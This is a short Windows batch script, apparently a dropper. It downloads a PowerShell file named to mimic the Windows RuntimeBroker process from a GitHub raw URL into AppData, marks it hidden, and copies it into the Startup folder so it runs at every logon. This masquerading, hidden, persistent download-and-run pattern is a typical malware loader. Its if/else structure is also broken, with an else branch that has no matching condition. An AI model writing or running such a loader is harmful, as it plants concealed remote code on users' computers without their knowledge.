@echo off

rem Set the URL of the PowerShell script on GitHub
set "githubURL=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/RuntimeBroker.ps1"

rem Set the destination path where the PowerShell script will be saved
set "destination=%AppData%\RuntimeBroker.ps1"

rem Download the file from GitHub using PowerShell's Invoke-WebRequest
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%githubURL%', '%destination%')"

    rem Hide the downloaded PowerShell script
    attrib +h "%destination%"

    rem Add the script to the user's Startup folder
    copy "%destination%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

    echo Script added to startup successfully.
) else (
    echo File download failed.
)

rem Exit the batch script
exit